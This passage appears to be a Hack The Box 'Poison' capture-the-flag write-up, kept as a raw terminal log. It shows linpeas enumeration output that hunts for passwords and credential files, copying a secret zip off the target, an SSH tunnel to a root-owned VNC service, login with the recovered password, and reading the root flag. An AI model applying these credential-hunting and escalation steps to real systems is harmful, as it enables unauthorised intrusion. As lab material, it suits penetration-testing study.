+-rw-r--r--  1 root  wheel  440 Jul 21  2017 /usr/ports/misc/amanda-server/files/patch-client-src__sendbackup-dump.c
+-rw-r--r--  1 root  wheel  1842 Jul 21  2017 /usr/ports/sysutils/boxbackup/files/999.boxbackup.in
+-rw-r--r--  1 root  wheel  261 Jul 21  2017 /usr/ports/sysutils/boxbackup/files/patch-bbackupd-config
+-rw-r--r--  1 root  wheel  569 Jul 21  2017 /usr/ports/sysutils/boxbackup/files/bbackupd.in
+-rw-r--r--  1 root  wheel  460 Jul 21  2017 /usr/ports/sysutils/flexbackup/files/patch-flexbackup.1
+-rw-r--r--  1 root  wheel  6294 Jul 21  2017 /usr/ports/sysutils/flexbackup/files/patch-flexbackup.conf
+-rw-r--r--  1 root  wheel  14307 Jul 21  2017 /usr/ports/sysutils/flexbackup/files/patch-flexbackup
+-rw-r--r--  1 root  wheel  3116 Jul 21  2017 /usr/ports/sysutils/flexbackup/files/patch-flexbackup.conf.5
+-rw-r--r--  1 root  wheel  1848 Jul 21  2017 /usr/ports/sysutils/boxbackup-devel/files/999.boxbackup.in
+-rw-r--r--  1 root  wheel  569 Jul 21  2017 /usr/ports/sysutils/boxbackup-devel/files/bbackupd.in
+-rw-r--r--  1 root  wheel  570 Jul 21  2017 /usr/ports/sysutils/backuppc4/files/backuppc.in
+-rw-r--r--  1 root  wheel  571 Jul 21  2017 /usr/ports/sysutils/flyback/files/patch-backup_backend.py
+-rw-r--r--  1 root  wheel  570 Jul 21  2017 /usr/ports/sysutils/backuppc/files/backuppc.in
+-rw-r--r--  1 root  wheel  377 Jul 21  2017 /usr/ports/sysutils/dvdbackup/files/patch-src__dvdbackup.c
+-rw-r--r--  1 root  wheel  570 Jul 21  2017 /usr/ports/sysutils/backuppc-devel/files/backuppc.in
+-rwxr-xr-x  1 root  wheel  1746 Jul 21  2017 /var/db/etcupdate/current/etc/periodic/daily/200.backup-passwd
+-rwxr-xr-x  1 root  wheel  1001 Jul 21  2017 /var/db/etcupdate/current/etc/periodic/daily/210.backup-aliases
+-rwxr-xr-x  1 root  wheel  1001 Jul 21  2017 /etc/periodic/daily/210.backup-aliases
+-rwxr-xr-x  1 root  wheel  1746 Jul 21  2017 /etc/periodic/daily/200.backup-passwd
+-rw-r--r--  1 root  wheel  44 Jan 24  2018 /etc/resolv.conf.bak
+
+[+] Searching tables inside readable .db/.sql/.sqlite files (limit 100)
+Found: /var/db/pkg/local.sqlite: SQLite 3.x database, user version 34, last written using SQLite version 3015002
+Found: /var/db/pkg/repo-FreeBSD.sqlite: SQLite 3.x database, user version 2014, last written using SQLite version 3015002
+Found: /etc/login.conf.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)
+Found: /etc/mail/aliases.db: regular file, no read permission
+Found: /etc/pwd.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)
+Found: /etc/spwd.db: regular file, no read permission
+ -> Extracting tables from /var/db/pkg/local.sqlite (limit 20)
+ -> Extracting tables from /var/db/pkg/repo-FreeBSD.sqlite (limit 20)
+
+[+] Web files?(output limit)
+
+[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
+-rw-r--r--  1 root  wheel  116 Jul 21  2017 /etc/hosts.equiv
+-rw-r--r--  1 root  wheel  21199 Jan 24  2018 /usr/local/etc/apache24/httpd.conf
+Checking for creds on /usr/local/etc/apache24/httpd.conf
+
+drwxr-xr-x  2 root  wheel  512 Jul 21  2017 /usr/ports/finance/trytond28_account_invoice_history
+Searching possible passwords inside /usr/ports/finance/trytond28_account_invoice_history (limit 100)
+
+drwxr-xr-x  2 root  wheel  512 Jul 21  2017 /usr/ports/finance/trytond28_product_cost_history
+Searching possible passwords inside /usr/ports/finance/trytond28_product_cost_history (limit 100)
+
+-rw-r--r--  1 root  wheel  2119 Jul 21  2017 /usr/ports/www/validator/files/patch-httpd_conf_httpd.conf
+Checking for creds on /usr/ports/www/validator/files/patch-httpd_conf_httpd.conf
+
+-r--r--r--  1 root  wheel  116 Jul 21  2017 /usr/share/examples/etc/hosts.equiv
+-rw-r--r--  1 root  wheel  116 Jul 21  2017 /var/db/etcupdate/current/etc/hosts.equiv
+-rw-r--r--  2 root  wheel  249 Jul 21  2017 /var/db/etcupdate/current/root/.profile
+
+[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
+
+[+] Readable files inside /tmp, /var/tmp, /var/backups, /private/tmp /private/var/at/tmp /private/var/tmp (limit 70)
+-rwxr-xr-x  1 charix  wheel  46631 Nov 23 23:06 /tmp/line.sh
+-r--r--r--  1 root  wheel  11 Nov 23 18:31 /tmp/.X1-lock
+-rwxr-xr-x  1 charix  wheel  293889 Nov 23 23:06 /tmp/linpeas.sh
+
+[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+/home/charix
+/tmp
+/tmp/.ICE-unix
+/tmp/.X11-unix
+/tmp/.XIM-unix
+/tmp/.font-unix
+/tmp/line.sh
+/var/mail/charix
+/var/tmp
+/var/tmp/vi.recover
+
+[+] Interesting GROUP writable files (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+  Group charix:
+
+
+[+] Searching passwords in config PHP files
+/usr/ports/security/phpdeadlock/files/patch-deadlock_admin_editconfig.php
+
+[+] Finding IPs inside logs (limit 70)
+1543866 /var/log/httpd-access.log:10.10.14.8
+220530 /var/log/httpd-error.log:10.10.14.8
+  18 192.168.253.133
+  10 10.10.14.4
+   6 /var/log/httpd-access.log:10.10.14.4
+   3 10.10.10.84
+   3 /var/log/messages:10.10.14.8
+   2 /var/log/utx.log:192.168.253.133
+   1 10.10.14.8
+   1 /var/log/utx.lastlogin:10.10.14.8
+   1 /var/log/httpd-access.log:192.168.253.133
+
+[+] Finding passwords inside logs (limit 70)
+/var/log/bsdinstall_log:DEBUG: variable.subr: New variable VAR_GROUP_PASSWORD -> groupPassword
+/var/log/bsdinstall_log:DEBUG: variable.subr: New variable VAR_USER_PASSWORD -> userPassword
+/var/log/bsdinstall_log:DEBUG: variable.subr: New variable VAR_USER_PASSWORD_EXPIRE -> userPasswordExpire
+
+[+] Finding emails inside logs (limit 70)
+   1 /var/log/Xorg.0.log:root@releng2.nyi.freebsd.org
+
+[+] Finding *password* or *credential* files in home (limit 70)
+
+[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside key folders (limit 70)
+/etc/defaults/periodic.conf:security_status_passwdless_enable="YES"
+/etc/defaults/periodic.conf:security_status_passwdless_period="daily"
+/etc/login.conf:	:passwd_format=sha512:\
+/etc/nsswitch.conf:passwd: compat
+/etc/nsswitch.conf:passwd_compat: nis
+/etc/pam.d/README:   password:  update authentication tokens.
+/etc/periodic/daily/200.backup-passwd:			sed 's/^\([<>] [^:]*\):[^:]*:/\1:(password):/'
+/etc/periodic/daily/200.backup-passwd:		cp -p /etc/master.passwd $bak/master.passwd.bak || rc=3
+/etc/periodic/daily/200.backup-passwd:		echo "$host passwd diffs:"
+/etc/periodic/daily/200.backup-passwd:	    echo "Backup passwd and group files:"
+/etc/periodic/security/400.passwdless:	echo 'Checking for passwordless accounts:'
+/etc/rc.d/sendmail:		challengePassword		= foobar
+/etc/security/audit_event:45014:AUE_modify_password:modify password:ad
+/etc/security/audit_event:6163:AUE_passwd:passwd:lo
+/etc/security/audit_event:6501:AUE_DARWIN_modify_password:modify password:ad
+/etc/ssl/openssl.cnf:challengePassword		= A challenge password
+/etc/ssl/openssl.cnf:challengePassword_max		= 20
+/etc/ssl/openssl.cnf:challengePassword_min		= 4
+/tmp/line.sh:    echo -e "\e[00;33m[-] htpasswd found - could contain passwords:\e[00m\n$htpasswd"
+/tmp/line.sh:  echo -e "\e[00;31m[-] Contents of /etc/passwd:\e[00m\n$readpasswd" 
+/tmp/line.sh:  echo -e "\e[00;31m[-] Password and storage information:\e[00m\n$logindefs" 
+/tmp/line.sh:  echo -e "\e[00;33m[+] We can connect to Postgres DB 'template0' as user 'postgres' with no password!:\e[00m\n$postcon1" 
+/tmp/line.sh:  echo -e "\e[00;33m[+] We can connect to Postgres DB 'template0' as user 'psql' with no password!:\e[00m\n$postcon2" 
+/tmp/line.sh:  echo -e "\e[00;33m[+] We can connect to Postgres DB 'template1' as user 'postgres' with no password!:\e[00m\n$postcon11" 
+/tmp/line.sh:  echo -e "\e[00;33m[+] We can connect to Postgres DB 'template1' as user 'psql' with no password!:\e[00m\n$postcon22" 
+/tmp/line.sh:hashesinpasswd=`grep -v '^[^:]*:[x]' /etc/passwd 2>/dev/null`
+/tmp/line.sh:htpasswd=`find / -name .htpasswd -print -exec cat {} \; 2>/dev/null`
+/tmp/line.sh:readmasterpasswd=`cat /etc/master.passwd 2>/dev/null`
+/tmp/line.sh:readpasswd=`cat /etc/passwd 2>/dev/null`
+
+[+] Finding possible password variables inside key folders (limit 140)
+sed: 1: "s,Dgpg.passphrase|Dsona ...": unterminated substitute pattern
+sed: 1: "s,Dgpg.passphrase|Dsona ...": unterminated substitute pattern
+
+[+] Finding possible password in config files
+ /etc/nsswitch.conf
+passwd: compat
+passwd_compat: nis
+ /etc/nscd.conf
+passwd yes
+ /etc/defaults/periodic.conf
+passwd
+passwd_enable="YES"			# Backup passwd & group
+passwdless
+passwdless_enable="YES"
+passwdless_period="daily"
+ /etc/defaults/rc.conf
+passwdd_enable="NO"		# Run kpasswdd (or NO)
+passwdd_program="/usr/libexec/kpasswdd" # path to kpasswdd
+passwdd_enable="NO"	# Run rpc.yppasswdd at boot time (or NO).
+passwdd_flags=""		# Flags to rpc.yppasswdd (if enabled).
+ /etc/login.conf
+passwd_format=sha512:\
+passwordtime=90d:\
+passwordtime@:\
+password@:\
+password=7d:\
+password hashes.
+passwd_format=des:\
+
+[+] Finding 'username' string inside key folders (limit 70)
+/etc/rc.d/sdpd:user="${sdpd_username:-nobody}"
+
+[+] Searching specific hashes inside files - less false positives (limit 70)
+
+
+TRANSFER SECRET ZIP FILE
+root@kali:~/htb/poison# scp charix@10.10.10.84:/home/charix/secret.zip .
+Password for charix@Poison:
+secret.zip                                                         100%  166     8.1KB/s   00:00    
+root@kali:~/htb/poison# ls -l
+total 444
+-rw-r--r-- 1 root root   1165 Samh  23 16:23 base64.txt
+-rwxr--r-- 1 root root   1295 Samh  23 16:25 decode_base64_x13.py
+-rwxr--r-- 1 root root    113 Samh  23 16:19 decode.sh
+-rw-r--r-- 1 root root    477 Samh  23 14:17 full.gnmap
+-rw-r--r-- 1 root root   1802 Samh  23 14:17 full.nmap
+-rw-r--r-- 1 root root   6986 Samh  23 14:17 full.xml
+-rwxr-xr-x 1 root root  46631 Samh  23 17:06 LinEnum.sh
+-rwxr-xr-x 1 root root  46631 Samh  23 1l:06 line.sh
+-rwxr-xr-x 1 root root 293889 Samh  23 17:06 linpeas.sh
+-rwxr-xr-x 1 root root   5491 Samh  23 14:29 php-reverse-shell.php
+-rw-r--r-- 1 root root   8965 Samh  23 17:04 poison_writeup
+-rw-r----- 1 root root    166 Samh  23 17:16 secret.zip
+-rwxr-xr-x 1 root root   5492 Samh  23 14:30 shell.php
+
+UNZIP WITH CHARIX PASSWORD
+root@kali:~/htb/poison# unzip secret.zip 
+Archive:  secret.zip
+[secret.zip] secret password: 
+ extracting: secret 
+
+REVIEW XVNC SERVICE RUNNING AS ROOT
+charix@Poison:/tmp % sockstat -4l
+USER     COMMAND    PID   FD PROTO  LOCAL ADDRESS         FOREIGN ADDRESS      
+www      httpd      1820  4  tcp4   *:80                  *:*
+www      httpd      1817  4  tcp4   *:80                  *:*
+www      httpd      1814  4  tcp4   *:80                  *:*
+www      httpd      1811  4  tcp4   *:80                  *:*
+www      httpd      1810  4  tcp4   *:80                  *:*
+www      httpd      1809  4  tcp4   *:80                  *:*
+www      httpd      1800  4  tcp4   *:80                  *:*
+www      httpd      1739  4  tcp4   *:80                  *:*
+www      httpd      1733  4  tcp4   *:80                  *:*
+www      httpd      1725  4  tcp4   *:80                  *:*
+root     sendmail   642   3  tcp4   127.0.0.1:25          *:*
+root     httpd      625   4  tcp4   *:80                  *:*
+root     sshd       620   4  tcp4   *:22                  *:*
+root     Xvnc       529   1  tcp4   127.0.0.1:5901        *:*
+root     Xvnc       529   3  tcp4   127.0.0.1:5801        *:*
+root     syslogd    390   7  udp4   *:514                 *:*
+
+
+RUNNING LOCALLY SO EXPOSE TO REMOTE HOST
+root@kali:~/htb/poison# ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84
+Password for charix@Poison:
+Last login: Mon Nov 23 22:52:38 2020 from 10.10.14.8
+FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017
+
+Welcome to FreeBSD!
+
+Release Notes, Errata: https://www.FreeBSD.org/releases/
+Security Advisories:   https://www.FreeBSD.org/security/
+FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
+FreeBSD FAQ:           https://www.FreeBSD.org/faq/
+Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
+FreeBSD Forums:        https://forums.FreeBSD.org/
+
+Documents installed with the system are in the /usr/local/share/doc/freebsd/
+directory, or can be installed later with:  pkg install en-freebsd-doc
+For other languages, replace "en" with a language code like de or fr.
+
+Show the version of FreeBSD installed:  freebsd-version ; uname -a
+Please include that output and any error messages when posting questions.
+Introduction to manual pages:  man man
+FreeBSD directory layout:      man hier
+
+Edit /etc/motd to change this login announcement.
+You can automatically download and install binary packages by doing
+
+	pkg install <package>
+
+This will also automatically install the packages that are dependencies
+for the package you install (ie, the packages it needs in order to work.)
+charix@Poison:~ % 
+
+
+LOGIN REMOTELY USING VNC
+root@kali:~/htb/poison# vncviewer 127.0.0.1:5901
+Connected to RFB server, using protocol version 3.8
+Enabling TightVNC protocol extensions
+Performing standard VNC authentication
+Password: 
+Authentication failed
+
+LOGIN REMOTELY USING VNC AND SECRET PASSWORD FILE
+root@kali:~/htb/poison# vncviewer 127.0.0.1:5901 -passwd secret
+Connected to RFB server, using protocol version 3.8
+Enabling TightVNC protocol extensions
+Performing standard VNC authentication
+Authentication successful
+Desktop name "root's X desktop (Poison:1)"
+VNC server default format:
+  32 bits per pixel.
+  Least significant byte first in each pixel.
+  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
+Using default colormap which is TrueColor.  Pixel format:
+  32 bits per pixel.
+  Least significant byte first in each pixel.
+  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
+Using shared memory PutImage
+Same machine: preferring raw encoding
+
+GET ROOT SHELL ACCESS
+root@Poison:~ # id
+uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
+
+GET ROOT FLAG
+root@Poison:~ # cat /root/root.txt
+#####################################
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
